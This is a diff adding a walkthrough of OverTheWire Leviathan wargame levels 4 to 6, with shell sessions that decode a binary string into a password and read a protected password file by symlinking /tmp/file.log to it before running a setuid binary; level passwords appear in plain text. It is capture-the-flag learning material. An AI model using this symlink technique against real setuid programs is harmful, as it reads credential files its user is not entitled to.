@@ -157,3 +157,56 @@ $ cat /etc/leviathan_pass/leviathan4
 vuH0coox6m
 $
 ```
+The password for the next level is **"vuH0coox6m"**
+
+#Leviathan 4 to 5
+
+Here we foun a directory called ".trash" and there is a executable file called "bin" and this file returns a binary pattern. We have retrieve the password for the next level by converting the binary into ascii by using a small perl script as bellow.
+
+```
+leviathan4@melinda:~$ ls -la
+total 24
+drwxr-xr-x   3 root root       4096 Nov 14  2014 .
+drwxr-xr-x 167 root root       4096 Jul  9 16:27 ..
+-rw-r--r--   1 root root        220 Apr  9  2014 .bash_logout
+-rw-r--r--   1 root root       3637 Apr  9  2014 .bashrc
+-rw-r--r--   1 root root        675 Apr  9  2014 .profile
+dr-xr-x---   2 root leviathan4 4096 Nov 14  2014 .trash
+leviathan4@melinda:~$ cd .trash/
+leviathan4@melinda:~/.trash$ ls
+bin
+leviathan4@melinda:~/.trash$ ./bin
+01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010
+leviathan4@melinda:~/.trash$ echo 01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101                                                                      01101001 00001010 | perl -lape '$_=pack"(B8)*",@F'
+Tith4cokei
+```
+
+The password for the next level is "Tith4cokei"
+
+#Leviathan 5 to 6
+Here there is an executable file called "leviathan5" in "/home/leviathan5/" directory. When it execute it seems like it is tring to read from a file in "/temp/". We have explored that this file is owned by "Leviathan6" and it belongs to "Leviathan5" group. So it is posible to pull the password of the Leviathan6's password from "/etc/leviathan_pass/leviathan6".
+
+```
+leviathan5@melinda:~$ ls -la
+total 28
+drwxr-xr-x   2 root       root       4096 Nov 14  2014 .
+drwxr-xr-x 167 root       root       4096 Jul  9 16:27 ..
+-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
+-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
+-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
+-r-sr-x---   1 leviathan6 leviathan5 7634 Nov 14  2014 leviathan5
+leviathan5@melinda:~$
+leviathan5@melinda:~$ ./leviathan5
+Cannot find /tmp/file.log
+leviathan5@melinda:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+leviathan5@melinda:~$
+leviathan5@melinda:~$
+leviathan5@melinda:~$ ./leviathan5
+UgaoFee4li
+leviathan5@melinda:~$
+```
+
+Password for the next level is "UgaoFee4li"
+
+
+
